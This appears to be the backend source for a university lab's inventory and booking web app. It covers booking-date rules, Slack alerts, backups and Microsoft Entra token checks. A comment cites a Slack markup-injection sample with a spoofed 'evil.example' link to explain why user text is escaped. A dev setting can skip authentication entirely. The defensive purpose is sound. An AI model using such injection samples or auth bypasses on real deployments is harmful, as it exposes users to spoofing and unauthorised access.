/**
 * LabTrack — Google Apps Script Backend
 *
 * Deploy this as a Web App from your Google Sheet:
 *   Extensions → Apps Script → paste this code → Deploy → Web App
 *   Execute as: Me | Who has access: Anyone
 *
 * Google Sheet must have these tabs — run setupNewLab() once and it creates them,
 * and adds any column a pre-existing sheet is missing:
 *   Items      — id | name | cat | qty | unit | loc | minQty | img | desc | status | usedBy | serial | displayId | shared | consumable
 *   Deliveries — id | item | qty | unit | from | receivedBy | date | tracking | status
 *   Checkouts  — id | itemId | item | user | out | ret | status | checkedOutByEmail | groupEmails | qty | fromTime | toTime | notes
 *   Orders     — id | store | item | link | qty | unit | price | cat | requestedBy | reason | urgency | date | status | requestedByEmail
 *   Settings   — key | value
 *   DeleteLog  — date | type | name | details | deletedBy
 *   AuditLog   — date | user | email | action | details    (auto-created)
 *   SlackQueue — time | emoji | title | details | fields  (auto-created; used by digest mode)
 *
 * TRIGGERS to set up (Extensions → Apps Script → Triggers):
 *   sendDailyDigest   → Time-driven → Day timer → 5pm–6pm (set script timezone to America/New_York)
 *   checkOverduesAndAlert → Time-driven → Day timer → 8am–9am (morning check)
 */

// ─── CONFIG ──────────────────────────────────────────────────────────────────
// Microsoft Entra ID (Azure AD) — sign-in is restricted to the Johns Hopkins
// tenant. The tenant ID below is JHU's; look it up again with:
//   https://login.microsoftonline.com/jh.edu/v2.0/.well-known/openid-configuration
const ENTRA_TENANT_ID = "9fa4f438-b1e6-473b-803f-86f8aedf0dec";
const ENTRA_CLIENT_ID = "06d4df0f-39e8-4c3a-aa24-8e76a45d1aa3";  // "LabTrack — Alliance AI Lab" app registration

// Optional extra restriction on the sign-in name's domain. Empty array = any
// account in the JHU tenant is allowed, which is what "must be a JHU person"
// normally means. Note JHU sign-in names (UPNs) are <JHED>@jh.edu even though
// mail is often @jhu.edu — so list "jh.edu" here, not "jhu.edu".
const ALLOWED_UPN_DOMAINS = [];

const SLACK_WEBHOOK_URL = "YOUR_SLACK_WEBHOOK_URL_HERE";

// ─── DEV ESCAPE HATCH ────────────────────────────────────────────────────────
// Set to a random string to accept "dev:<key>" as a token and skip Entra
// verification entirely, so the app can be exercised end-to-end before admin
// consent is granted. It must match LAB_CONFIG.dev_key in index.html.
//
// ⚠️  This removes authentication from a web app deployed as "Anyone". The key
//     is visible in the page source, so treat it as public: use it only on
//     localhost against a scratch Sheet, and set it back to "" before this
//     deployment holds real inventory. The frontend shows a red banner while on.
//
// DEV_NO_AUTH_EMAIL is the identity assumed while the hatch is open — point it
// at a real UPN in the admins list to exercise admin-only paths.
const DEV_NO_AUTH_KEY = "";
const DEV_NO_AUTH_EMAIL = "zzhan409@jh.edu";

// Seeded into the Settings "admins" list by setupNewLab() on a fresh sheet.
// Must be the sign-in name (<JHED>@jh.edu), not the @jhu.edu mail alias.
const INITIAL_ADMIN = "zzhan409@jh.edu";

// ─── LABEL IDS ────────────────────────────────────────────────────────────────
// PREFIX-NNN, and a split unit appends -NN:  RM-001,  RM-001-01
// These get printed on stickers and stuck to hardware, so they are kept short.
// index.html mirrors both widths for its preview; this file assigns the real ones.
const LABEL_DIGITS = 3;      // main number
const LABEL_SUB_DIGITS = 2;  // split-unit suffix

// ─── BOOKING RULES ───────────────────────────────────────────────────────────
// A checkout runs from `out` to `ret`. A shared item may additionally be booked
// for a daily window — fromTime/toTime, e.g. 09:00–12:00 every day in that range
// — so several people can hold the same thing on the same day at different hours.
// Empty times mean all day.
//
// Holding anything for longer than this needs an admin to agree, whether it is
// shared or not: a month-long checkout is a transfer, not a loan.
const MAX_DAYS_WITHOUT_APPROVAL = 7;
const MAX_LEAD_DAYS = 31;              // how far ahead a booking may start
const MAX_HOLD_DAYS = 90;              // and how long it may run once it does
const CHECKOUT_PENDING = "Pending Approval";

// "YYYY-MM-DD HH:MM" → epoch ms. Apps Script's Date parses this reliably enough
// for comparison; the values are always produced by the client in this shape.
// "YYYY-MM-DD HH:MM" or "YYYY-MM-DD" as an instant on the local clock.
//
// new Date("2026-08-25") is parsed as UTC midnight, while new Date("2026-08-25T09:00")
// is parsed as local — so leaving the return *time* blank, which the form lets you
// do, put the end of the hold four hours before the day it names even began. The
// two ends of one booking were being measured on two different clocks: a hold from
// 18 Aug 09:00 to 25 Aug came out as 6.46 days and slipped under the seven-day
// rule, and its slot read as free from 20:00 the evening before. Build the instant
// from the parts instead of leaving it to the parser.
function bookingMs_(s) {
  var m = String(s || "").trim().match(/^(\d{4})-(\d{2})-(\d{2})(?:[ T](\d{1,2}):(\d{2}))?$/);
  if (m) {
    var d = new Date(+m[1], +m[2] - 1, +m[3], m[4] === undefined ? 0 : +m[4], m[5] === undefined ? 0 : +m[5]);
    return isNaN(d.getTime()) ? null : d.getTime();
  }
  var f = new Date(String(s || "").trim().replace(" ", "T"));
  return isNaN(f.getTime()) ? null : f.getTime();
}

function bookingDays_(out, ret) {
  var a = bookingMs_(out), b = bookingMs_(ret);
  if (a === null || b === null) return 0;
  return (b - a) / 86400000;
}

function needsApproval_(c) {
  return bookingDays_(c.out, c.ret) > MAX_DAYS_WITHOUT_APPROVAL;
}

/**
 * True when a booking starts further ahead than the lab books.
 *
 * A request starting months out would sit in the queue holding its slot open
 * against every overlapping booking until somebody decided it, so one speculative
 * request could freeze an item for a whole term. Only the *start* is capped — a
 * long hold is still allowed, it just needs approval.
 *
 * Past start dates stay legal: a checkout logged after the fact is normal.
 */
function leadTooFar_(c) {
  const start = bookingMs_(c.out);
  if (start === null) return false;
  return start - new Date().getTime() > MAX_LEAD_DAYS * 86400000;
}

/**
 * Why a booking's dates can't stand, or "" if they can.
 *
 * Every rule in this file is a comparison between two instants, and a comparison
 * against something unparseable is false — so a blank, garbled or backwards range
 * doesn't break the rules loudly, it slips past all of them. A return date before
 * the checkout date is the one a person actually hits, by typing the wrong month
 * into the second date box: the hold measures as negative days so it never needs
 * approval, it clashes with nothing so it never blocks, and it draws on no
 * calendar day at all, while sitting in the list as an active, overdue loan.
 */
function badRange_(c) {
  const start = bookingMs_(c.out), end = bookingMs_(c.ret);
  if (start === null) return "Checkout date is missing or not a date";
  if (end === null) return "Return date is missing or not a date";
  if (end <= start) return "Return date must be after the checkout date";
  // A hold that runs to next June puts every overlapping booking until then behind
  // an admin, because rule 3's queue is transitive. That is the intended shape for
  // a genuine semester-long hold; it is also what one wrong digit in the year does.
  // The cap is set well past any real hold so it only ever catches the typo.
  if (end - start > MAX_HOLD_DAYS * 86400000) {
    return "A booking can run for at most " + MAX_HOLD_DAYS + " days — check the return date's year";
  }
  const from = minutes_(c.fromTime), to = minutes_(c.toTime);
  // Blank is all day; one of the pair without the other is half a window.
  const hasFrom = String(c.fromTime || "") !== "", hasTo = String(c.toTime || "") !== "";
  if (hasFrom !== hasTo) return "A daily window needs both a start and an end time";
  if (hasFrom && (from === null || to === null)) return "Daily window times must look like HH:MM";
  if (hasFrom && to <= from) return "The daily window must end after it starts";
  return "";
}

// True while a booking is actually under way — started, and not yet over.
//
// In Use means somebody physically has the thing, so a booking for the tenth of
// next month should not take it off the shelf today; it did, because that flag used
// to be the only thing keeping a sole-use item exclusive. Rule 2 does that job now,
// by date, so the flag is free to mean what it says. The end matters as well as the
// start: logging a loan after it finished is normal, and should not hand the item
// to somebody who has already given it back. syncItemStatuses() keeps this true as
// the days pass.
function bookingLiveNow_(c) {
  const now = new Date().getTime();
  const start = bookingMs_(c.out), end = bookingMs_(c.ret);
  if (start !== null && start > now) return false;
  if (end !== null && end <= now) return false;
  return true;
}

/**
 * Who is holding a sole-use item right now, or "" if it is on the shelf.
 *
 * Sole-use items are never clash-checked by date — bookingConflict_ deliberately
 * skips them — so the only thing keeping one exclusive is the In Use flag. That
 * makes this the whole of rule 2 for them, and it has to be tested server-side:
 * the picker that hides In Use items from the form is working off a copy of the
 * item list that is up to a poll old.
 */
function soleUseHeldBy_(c) {
  const item = findRow("Items", c.itemId ? c.itemId : function (r) { return r.name === c.item; });
  if (!item) return "";
  const shared = item.shared === true || String(item.shared).toLowerCase() === "true";
  if (shared || item.status !== "In Use") return "";
  const holders = Array.isArray(item.usedBy) ? item.usedBy : [];
  if (holders.indexOf(c.user) >= 0) return "";   // already theirs
  return holders.length ? holders.join(", ") : "someone else";
}

/**
 * Why a booking has to wait for an admin, or "" if it can go straight through.
 *
 * Two reasons. Being long is the obvious one. The other is that somebody is
 * already queuing for the same slot: without this, a three-day booking would
 * simply take what a three-week request has been waiting on, and win purely by
 * being short enough to skip the queue. Whoever asked first deserves to have
 * their claim looked at, so the newcomer joins the queue instead of jumping it.
 *
 * Only genuinely overlapping requests count — a pending request for October does
 * not make a booking in December wait.
 */
function waitReason_(c, ignoreId) {
  if (needsApproval_(c)) return "long";
  if (competing_(c, ignoreId).length) return "queue";
  return "";
}

// "HH:MM" → minutes past midnight. Blank means all day, which the callers treat
// as the full 0–1440 range rather than as a missing value.
function minutes_(hhmm) {
  var m = String(hhmm || "").match(/^(\d{1,2}):(\d{2})$/);
  return m ? parseInt(m[1], 10) * 60 + parseInt(m[2], 10) : null;
}

// Two bookings clash when their date ranges overlap AND their daily windows do.
// Touching endpoints don't clash: handing something over at 12:00 is fine.
function bookingsClash_(a, b) {
  var aStart = bookingMs_(a.out), aEnd = bookingMs_(a.ret);
  var bStart = bookingMs_(b.out), bEnd = bookingMs_(b.ret);
  if (aStart === null || aEnd === null || bStart === null || bEnd === null) return false;
  if (aStart >= bEnd || bStart >= aEnd) return false;

  var aFrom = minutes_(a.fromTime), aTo = minutes_(a.toTime);
  var bFrom = minutes_(b.fromTime), bTo = minutes_(b.toTime);
  if (aFrom === null || aTo === null || bFrom === null || bTo === null) return true;  // either is all day
  return aFrom < bTo && bFrom < aTo;
}

/**
 * Why a booking can't stand, or "" if it can.
 *
 * Called twice: once when the booking is made, and again when an admin approves a
 * long hold — a pending request reserves nothing, so by the time someone gets to
 * it the slot may be gone. ignoreId skips the row being approved, which is in the
 * table by then and would otherwise clash with itself.
 */
function overlapping_(c, ignoreId, status) {
  return readTable("Checkouts").filter(function (x) {
    if (ignoreId != null && String(x.id) === String(ignoreId)) return false;
    if (x.status !== status) return false;
    var same = x.itemId ? String(x.itemId) === String(c.itemId) : x.item === c.item;
    return same && bookingsClash_(x, c);
  });
}

/**
 * Why a booking can't stand, or "" if it can.
 *
 * Only an *Active* booking blocks. A pending request reserves nothing — that is
 * the whole point of it being pending — so several people may ask for the same
 * week and an admin picks between them. See competing_().
 *
 * Called twice: when the booking is made, and again when a long hold is approved,
 * because the slot may have been taken while the request sat in the queue.
 * ignoreId skips the row being approved or edited, which is in the table by then
 * and would otherwise clash with itself.
 *
 * This used to skip sole-use items on the grounds that they are kept exclusive by
 * their availability rather than by the hour. They are not: the In Use flag is set
 * by the browser's copy of the item list, which is up to a poll old, so two people
 * who pressed Check Out inside the same thirty seconds both got the arm. And the
 * flag knows nothing about dates, so it could not tell a booking for next week
 * from one for right now. A date range is the honest test for both kinds of item —
 * a sole-use item simply has no daily window, which reads as all day and clashes
 * with anything inside the range, which is what exclusive means.
 */
function bookingConflict_(c, ignoreId) {
  const clash = overlapping_(c, ignoreId, "Active")[0];
  if (!clash) return "";
  return "Already booked by " + clash.user + " (" + clash.out + " \u2192 " + clash.ret +
         (clash.fromTime ? ", " + clash.fromTime + "\u2013" + clash.toTime : "") + ")";
}

// Other people waiting on the same slot. Not an error — the admin needs to see
// them side by side, so they are reported and rendered, never used to refuse.
//
// Unlike blocking, this covers sole-use items too, and matters most there: a
// pending request doesn't mark the item In Use, so the availability filter that
// normally keeps a sole-use item exclusive cannot see the queue at all.
function competing_(c, ignoreId) {
  return overlapping_(c, ignoreId, CHECKOUT_PENDING).map(function (x) {
    return { id: x.id, user: x.user, out: x.out, ret: x.ret, fromTime: x.fromTime, toTime: x.toTime };
  });
}

// Lazy prefix so a prefix containing a hyphen still parses; the sub group is
// optional. A width-based regex can't do this any more — at three digits,
// /^.+-\d{3}$/ matches "RM-001" and would read every plain item as a split unit.
function parseDisplayId_(displayId) {
  var m = String(displayId || "").match(/^(.*?)-(\d+)(?:-(\d+))?$/);
  if (!m) return null;
  return { prefix: m[1], num: parseInt(m[2], 10), sub: m[3] === undefined ? null : parseInt(m[3], 10) };
}
function mainId_(prefix, num) {
  return prefix + "-" + String(num).padStart(LABEL_DIGITS, "0");
}

// ─── SLACK HELPER ────────────────────────────────────────────────────────────
// slack_mode in Settings tab: "all" | "important" | "digest" | "off"
// "important" = only deletions, urgent/high orders, overdue returns
// "digest" = queues to SlackQueue tab, sent by daily trigger (sendDailyDigest)
function getSlackMode() {
  try {
    var mode = readSettings()["slack_mode"];
    if (mode !== undefined) return String(mode).trim() || "all";
  } catch(e) {}
  return "all";
}

// Slack's mrkdwn reads <...> as a control sequence: <!channel> pings everybody in
// the channel and <https://evil.example|Click here> renders as a link wearing a
// label of the sender's choosing. Item names, notes and person names all end up
// inside a message, and all of them are typed by whoever is using the app. These
// three characters are the ones Slack asks you to escape; * and _ stay live, so
// the labels the callers build still render bold.
function slackEsc_(v) {
  return String(v == null ? "" : v).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function sendSlack(emoji, title, details, fields, priority, link) {
  if (!SLACK_WEBHOOK_URL || SLACK_WEBHOOK_URL === "YOUR_SLACK_WEBHOOK_URL_HERE" || SLACK_WEBHOOK_URL === "") return;
  var mode = getSlackMode();
  if (mode === "off") return;
  // priority: "high" for deletions, urgent orders, overdue; "normal" for everything else
  var isHigh = (priority === "high");
  if (mode === "important" && !isHigh) return;
  if (mode === "digest") {
    // Queue it instead of sending immediately (high-priority still sends now)
    appendRow("SlackQueue", {
      time: new Date().toISOString(), emoji: emoji, title: title,
      details: details || "", fields: JSON.stringify(fields || []),
    });
    if (!isHigh) return; // high-priority also sends immediately
  }
  try {
    var blocks = [
      { type: "section", text: { type: "mrkdwn", text: emoji + " *" + slackEsc_(title) + "*" } }
    ];
    if (details) blocks.push({ type: "section", text: { type: "mrkdwn", text: slackEsc_(details) } });
    // The one place a real link is wanted. Built here, after escaping, so a URL
    // carrying a "|" cannot relabel itself.
    if (link) blocks.push({ type: "section", text: { type: "mrkdwn", text: "<" + slackEsc_(link) + "|Purchase link>" } });
    if (fields && fields.length > 0) {
      blocks.push({ type: "section", fields: fields.map(function(f) { return { type: "mrkdwn", text: slackEsc_(f) }; }) });
    }
    blocks.push({ type: "context", elements: [{ type: "mrkdwn", text: "LabTrack · " + new Date().toLocaleString() }] });
    UrlFetchApp.fetch(SLACK_WEBHOOK_URL, {
      method: "post", contentType: "application/json",
      payload: JSON.stringify({ text: emoji + " " + slackEsc_(title), blocks: blocks }),
      muteHttpExceptions: true,
    });
  } catch (e) {
    console.log("Slack error (non-fatal): " + e.message);
  }
}

// ─── DIGEST HELPERS ──────────────────────────────────────────────────────────
function getPendingOrders_() {
  return readTable("Orders").filter(function(o){ return o.status==="Pending"||o.status==="Approved"||o.status==="Ordered"; });
}

function getOverdueCheckouts_() {
  var today = new Date().toISOString().slice(0,10);
  return readTable("Checkouts").filter(function(c){ return c.status==="Active" && c.ret && String(c.ret).slice(0,10) < today; });
}

function getLowStockItems_() {
  // An empty qty means the item isn't counted, and Number("") is 0 — without the
  // first test every untracked supply would show up in the digest as low stock.
  return readTable("Items").filter(function(i){
    return i.qty !== "" && i.qty !== undefined && i.qty !== null
        && i.minQty !== undefined && Number(i.minQty) > 0 && Number(i.qty) <= Number(i.minQty);
  });
}

// Sort orders so Urgent/High come first
function sortOrdersByUrgency_(list) {
  return list.slice().sort(function(a, b) {
    var aH = (a.urgency === "Urgent" || a.urgency === "High") ? 0 : 1;
    var bH = (b.urgency === "Urgent" || b.urgency === "High") ? 0 : 1;
    return aH - bH;
  });
}

// Format a single order line with urgency badge inline
function formatOrderLine_(o) {
  var badge = (o.urgency === "Urgent") ? "🚨 " : (o.urgency === "High") ? "⚠️ " : "";
  var parts = [badge + "*" + o.item + "*  " + o.qty + " " + (o.unit || "")];
  if (o.store) parts.push(o.store);
  if (o.price) parts.push(o.price);
  if (o.link)  parts.push("<" + o.link + "|link>");
  return "• " + parts.join(" | ");
}

// ─── DAILY DIGEST (Trigger: sendDailyDigest → Day timer → 5pm–6pm, timezone: America/New_York) ─
function sendDailyDigest() {
  if (!SLACK_WEBHOOK_URL || SLACK_WEBHOOK_URL === "YOUR_SLACK_WEBHOOK_URL_HERE") return;

  var now = new Date();
  var dateStr = now.toLocaleDateString("en-US", {weekday:"long", month:"short", day:"numeric", year:"numeric"});

  var pending   = getPendingOrders_();
  var overdues  = getOverdueCheckouts_();
  var lowStock  = getLowStockItems_();

  // Queue (today's activity log)
  var queuedRows = readTable("SlackQueue");

  var blocks = [
    { type: "header", text: { type: "plain_text", text: "📊 LabTrack Daily Summary — " + dateStr, emoji: true } },
    { type: "divider" }
  ];

  // ── Orders: grouped by stage so PI sees exactly what action is needed ──
  var needsApproval    = pending.filter(function(o){ return o.status === "Pending"; });
  var needsOrdering    = pending.filter(function(o){ return o.status === "Approved"; });
  var awaitingDelivery = pending.filter(function(o){ return o.status === "Ordered"; });

  if (pending.length === 0) {
    blocks.push({ type: "section", text: { type: "mrkdwn", text: "🛒 *Orders:* No active orders" } });
  } else {
    // 1 — Needs Approval (Pending): PI must act
    if (needsApproval.length > 0) {
      var approvalList = sortOrdersByUrgency_(needsApproval);
      var approvalText = approvalList.slice(0, 8).map(formatOrderLine_).join("\n");
      if (needsApproval.length > 8) approvalText += "\n_…and " + (needsApproval.length - 8) + " more_";
      blocks.push({ type: "section", text: { type: "mrkdwn", text: "🔔 *Needs Approval (" + needsApproval.length + ")*\n" + approvalText } });
    }

    // 2 — Approved / Needs Ordering: approved but not yet purchased
    if (needsOrdering.length > 0) {
      var orderingList = sortOrdersByUrgency_(needsOrdering);
      var orderingText = orderingList.slice(0, 8).map(formatOrderLine_).join("\n");
      if (needsOrdering.length > 8) orderingText += "\n_…and " + (needsOrdering.length - 8) + " more_";
      blocks.push({ type: "section", text: { type: "mrkdwn", text: "🛍️ *Approved — Place Order (" + needsOrdering.length + ")*\n" + orderingText } });
    }

    // 3 — Ordered / Awaiting Delivery: already purchased, just waiting
    if (awaitingDelivery.length > 0) {
      var deliveryList = sortOrdersByUrgency_(awaitingDelivery);
      var deliveryText = deliveryList.slice(0, 8).map(formatOrderLine_).join("\n");
      if (awaitingDelivery.length > 8) deliveryText += "\n_…and " + (awaitingDelivery.length - 8) + " more_";
      blocks.push({ type: "section", text: { type: "mrkdwn", text: "📬 *Ordered — Awaiting Delivery (" + awaitingDelivery.length + ")*\n" + deliveryText } });
    }
  }

  // ── Overdue checkouts ──
  if (overdues.length > 0) {
    var odText = overdues.map(function(o){
      return "• *" + o.item + "* — " + o.user + " (due " + String(o.ret).slice(0,10) + ")";
    }).join("\n");
    blocks.push({ type: "section", text: { type: "mrkdwn", text: "🔴 *Overdue Checkouts (" + overdues.length + ")*\n" + odText } });
  } else {
    blocks.push({ type: "section", text: { type: "mrkdwn", text: "✅ *Checkouts:* No overdue items" } });
  }

  // ── Low stock ──
  if (lowStock.length > 0) {
    var lsText = lowStock.slice(0,6).map(function(i){
      var out = Number(i.qty) <= 0;
      return "• *" + i.name + "* — " + i.qty + "/" + i.minQty + " " + i.unit
           + (out ? " (OUT OF STOCK)" : " (reorder needed)");
    }).join("\n");
    if (lowStock.length > 6) lsText += "\n_…and " + (lowStock.length-6) + " more_";
    blocks.push({ type: "section", text: { type: "mrkdwn", text: "📦 *Low Stock (" + lowStock.length + ")*\n" + lsText } });
  }

  // ── Today's activity: count by type only (no listing individual events) ──
  if (queuedRows.length > 0) {
    var counts = {};
    queuedRows.forEach(function(r) {
      var emoji = String(r.emoji).trim();
      counts[emoji] = (counts[emoji] || 0) + 1;
    });
    var countLine = Object.keys(counts).map(function(e){ return e + " ×" + counts[e]; }).join("  ·  ");
    blocks.push({ type: "context", elements: [{ type: "mrkdwn", text: "Today's activity: " + countLine + "  (" + queuedRows.length + " total)" }] });
  }

  blocks.push({ type: "context", elements: [{ type: "mrkdwn", text: "LabTrack · Auto-digest · " + now.toLocaleString("en-US",{timeZone:"America/New_York"}) + " ET" }] });

  try {
    UrlFetchApp.fetch(SLACK_WEBHOOK_URL, {
      method: "post", contentType: "application/json",
      payload: JSON.stringify({ text: "📊 LabTrack Daily Summary — " + dateStr, blocks: blocks }),
      muteHttpExceptions: true,
    });
  } catch(e) { console.log("Digest send failed: " + e.message); }

  // Clear queue
  if (queuedRows.length > 0) clearTable("SlackQueue");
}

// Admin can trigger manually (via UI button → doPost "sendDigest")
function sendManualDigest() { sendDailyDigest(); }

// ─── SETUP TRIGGERS (run once from the Apps Script editor) ───────────────────
// Run this function manually from the editor to create both time-based triggers.
// Requires: Project Settings → Time zone = America/New_York
// After running, verify in Triggers tab (clock icon on left sidebar).
function createTriggers() {
  // Remove any existing triggers for these functions to avoid duplicates
  ScriptApp.getProjectTriggers().forEach(function(t) {
    var fn = t.getHandlerFunction();
    if (fn === "sendDailyDigest" || fn === "checkOverduesAndAlert" ||
        fn === "backupSpreadsheet" || fn === "syncItemStatuses") {
      ScriptApp.deleteTrigger(t);
    }
  });
  // Daily digest at 5pm (script timezone must be America/New_York)
  ScriptApp.newTrigger("sendDailyDigest")
    .timeBased()
    .atHour(17)
    .everyDays(1)
    .create();
  // Overdue alert at 8am
  ScriptApp.newTrigger("checkOverduesAndAlert")
    .timeBased()
    .atHour(8)
    .everyDays(1)
    .create();
  // Bring In Use in line with the day's bookings, first thing
  ScriptApp.newTrigger("syncItemStatuses")
    .timeBased()
    .atHour(6)
    .everyDays(1)
    .create();
  // Weekly backup every Sunday at 3am
  ScriptApp.newTrigger("backupSpreadsheet")
    .timeBased()
    .onWeekDay(ScriptApp.WeekDay.SUNDAY)
    .atHour(3)
    .create();
  Logger.log("✅ Triggers created (digest, overdue alert, weekly backup). Verify in Triggers tab. Time zone must be America/New_York.");
}

// ─── SPREADSHEET BACKUP ──────────────────────────────────────────────────────
// Copies the entire spreadsheet into a "LabTrack Backups" folder in Google Drive.
// Keeps the most recent BACKUP_KEEP_COUNT copies and trashes the rest.
// Called automatically every Sunday at 3am (set up via createTriggers()),
// or manually via the "Backup Now" button in the admin UI.
// SHEETS-ONLY — does not survive a storage migration. This copies the whole
// spreadsheet file to Drive; a SharePoint List has version history and a recycle
// bin instead, so on migration this function is deleted rather than ported.
function backupSpreadsheet() {
  var BACKUP_KEEP_COUNT = 12; // keep ~3 months of weekly backups
  var FOLDER_NAME = "LabTrack Backups";

  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var ssFile = DriveApp.getFileById(ss.getId());

  // Place backup folder next to the spreadsheet (or in root if no parent)
  var parents = ssFile.getParents();
  var parentFolder = parents.hasNext() ? parents.next() : DriveApp.getRootFolder();

  // Find or create the backup folder
  var backupFolder;
  var folders = parentFolder.getFoldersByName(FOLDER_NAME);
  if (folders.hasNext()) {
    backupFolder = folders.next();
  } else {
    backupFolder = parentFolder.createFolder(FOLDER_NAME);
  }

  // Name the backup with a timestamp (no colons — not allowed in Drive file names)
  var now = new Date();
  var pad = function(n) { return String(n).padStart(2, "0"); };
  var dateStr = now.getFullYear() + "-" + pad(now.getMonth() + 1) + "-" + pad(now.getDate());
  var timeStr = pad(now.getHours()) + "h" + pad(now.getMinutes());
  var backupName = "LabTrack Backup " + dateStr + " " + timeStr;

  ssFile.makeCopy(backupName, backupFolder);

  // Prune: keep only the most recent BACKUP_KEEP_COUNT files
  var files = [];
  var iter = backupFolder.getFiles();
  while (iter.hasNext()) {
    var f = iter.next();
    files.push({ file: f, date: f.getDateCreated() });
  }
  files.sort(function(a, b) { return b.date - a.date; }); // newest first
  for (var i = BACKUP_KEEP_COUNT; i < files.length; i++) {
    files[i].file.setTrashed(true);
  }

  // Record last backup time in Settings
  var displayTime = dateStr + " " + pad(now.getHours()) + ":" + pad(now.getMinutes());
  writeSetting("last_backup", displayTime);

  sendSlack("💾", "Weekly Backup Complete", null, [
    "*File*\n" + backupName,
    "*Location*\n" + FOLDER_NAME,
    "*Kept*\n" + Math.min(files.length, BACKUP_KEEP_COUNT) + " backups"
  ]);
  Logger.log("✅ Backup created: " + backupName + " → " + FOLDER_NAME);
  return backupName;
}

// ─── OVERDUE ALERT (Trigger: checkOverduesAndAlert → Day timer → 8am–9am) ────
/**
 * Bring every item's In Use flag in line with the bookings that are live today.
 *
 * A booking no longer takes its item off the shelf the moment it is made — it does
 * so when its start arrives. Something has to notice that the day has come, and
 * this is it: a daily pass that adds a holder for every Active booking now under
 * way, and drops one for every booking that has ended without being returned.
 *
 * Written to be safe to run at any time and any number of times — it derives the
 * flag from the Checkouts table rather than toggling it, so a missed run costs a
 * day of staleness and nothing else. Also called from checkOverduesAndAlert(), so
 * a lab that only ever sets up one trigger still gets it.
 */
function syncItemStatuses() {
  const live = {};            // itemKey -> [names holding it right now]
  readTable("Checkouts").forEach(function (c) {
    if (c.status !== "Active" || !bookingLiveNow_(c)) return;
    const key = c.itemId ? "id:" + c.itemId : "name:" + c.item;
    (live[key] = live[key] || []).push(c.user);
  });

  var changed = 0;
  readTable("Items").forEach(function (it) {
    if (it.consumable === true || String(it.consumable).toLowerCase() === "true") return;
    // Maintenance and Broken are somebody's deliberate call about the object, not a
    // consequence of who booked it. Leave them alone.
    if (it.status === "Maintenance" || it.status === "Broken") return;
    const shared = it.shared === true || String(it.shared).toLowerCase() === "true";
    const holders = live["id:" + it.id] || live["name:" + it.name] || [];
    const want = holders.slice().sort();
    const have = (Array.isArray(it.usedBy) ? it.usedBy : []).slice().sort();
    // A shared item stays Available however many people have it — same rule as
    // updateItemStatus, which is the only other place this is decided.
    const wantStatus = (!shared && want.length) ? "In Use" : "Available";
    if (wantStatus === it.status && want.join("\u0000") === have.join("\u0000")) return;
    updateRow("Items", it.id ? it.id : function (r) { return r.name === it.name; },
              { status: wantStatus, usedBy: want });
    changed++;
  });
  return changed;
}

function checkOverduesAndAlert() {
  // Yesterday's bookings ended and today's began while nobody was looking.
  try { syncItemStatuses(); } catch (e) { console.log("syncItemStatuses failed (non-fatal): " + e.message); }
  var overdues = getOverdueCheckouts_();
  if (overdues.length === 0) return;
  var text = overdues.map(function(o){
    return "• *" + o.item + "* — " + o.user + " (due " + String(o.ret).slice(0,10) + ")";
  }).join("\n");
  sendSlack("🔴", "Overdue Checkouts (" + overdues.length + ")", text, [], "high");
}

// ─── TOKEN VERIFICATION (Microsoft Entra ID) ─────────────────────────────────
// Unlike Google, Microsoft has no tokeninfo endpoint that validates a token for
// you — we have to verify the RS256 signature ourselves against the tenant's
// published JWKS, then check the claims.
//
// Returns { email, name, oid } on success, or null on any failure.
function verifyToken(token) {
  if (!token || token === "local") return null;

  // Dev escape hatch — inert unless DEV_NO_AUTH_KEY is set. See the warning at
  // the top of this file before enabling it.
  if (DEV_NO_AUTH_KEY && String(token) === "dev:" + DEV_NO_AUTH_KEY) {
    var devEmail = String(DEV_NO_AUTH_EMAIL || "").trim().toLowerCase();
    return { email: devEmail, name: "Dev Mode (" + devEmail + ")", oid: "dev" };
  }

  try {
    var parts = String(token).split(".");
    if (parts.length !== 3) return null;

    var header = JSON.parse(base64UrlToString_(parts[0]));
    if (header.alg !== "RS256" || !header.kid) return null;

    // Look up the signing key by kid. If the cached JWKS doesn't have it, the
    // tenant probably rotated keys — refetch once, bypassing the cache.
    var jwk = getEntraSigningKey_(header.kid, false);
    if (!jwk) jwk = getEntraSigningKey_(header.kid, true);
    if (!jwk) return null;

    if (!verifyRs256_(parts[0] + "." + parts[1],
                      Utilities.base64DecodeWebSafe(parts[2]), jwk.n, jwk.e)) {
      return null;
    }

    var claims = JSON.parse(base64UrlToString_(parts[1]));
    var now = Math.floor(Date.now() / 1000);
    var SKEW = 300;  // 5 min clock skew tolerance

    if (!claims.exp || now > Number(claims.exp) + SKEW) return null;
    if (claims.nbf && now < Number(claims.nbf) - SKEW) return null;
    // aud: the token was minted for THIS app, not some other app that happens
    // to be in the same tenant. This is what stops token replay from another site.
    if (claims.aud !== ENTRA_CLIENT_ID) return null;
    // tid + iss: the signer is the JHU tenant.
    if (claims.tid !== ENTRA_TENANT_ID) return null;
    if (claims.iss !== "https://login.microsoftonline.com/" + ENTRA_TENANT_ID + "/v2.0") return null;

    var upn = String(claims.preferred_username || claims.upn || claims.email || "")
                .trim().toLowerCase();
    if (!upn || upn.indexOf("@") < 0) return null;

    if (ALLOWED_UPN_DOMAINS.length > 0 &&
        ALLOWED_UPN_DOMAINS.indexOf(upn.split("@")[1]) < 0) {
      return null;
    }

    return { email: upn, name: claims.name || upn, oid: claims.oid || "" };
  } catch (e) {
    return null;
  }
}

// Fetch the tenant's signing keys, cached for 6h so the common path makes no
// network call at all (the old Google tokeninfo check cost a round trip per request).
function getEntraSigningKey_(kid, forceRefresh) {
  var cache = CacheService.getScriptCache();
  var cacheKey = "entra_jwks_" + ENTRA_TENANT_ID;
  var raw = forceRefresh ? null : cache.get(cacheKey);
  if (!raw) {
    var resp = UrlFetchApp.fetch(
      "https://login.microsoftonline.com/" + ENTRA_TENANT_ID + "/discovery/v2.0/keys",
      { muteHttpExceptions: true }
    );
    if (resp.getResponseCode() !== 200) return null;
    raw = resp.getContentText();
    cache.put(cacheKey, raw, 21600);
  }
  var keys = (JSON.parse(raw) || {}).keys || [];
  for (var i = 0; i < keys.length; i++) {
    if (keys[i].kid === kid && keys[i].n && keys[i].e) return keys[i];
  }
  return null;
}

function base64UrlToString_(s) {
  return Utilities.newBlob(Utilities.base64DecodeWebSafe(s)).getDataAsString();
}

// ─── RS256 SIGNATURE VERIFICATION ────────────────────────────────────────────
// Apps Script's Utilities can sign with RSA but cannot verify, so this is a
// direct implementation of RSASSA-PKCS1-v1_5 verification on top of BigInt.

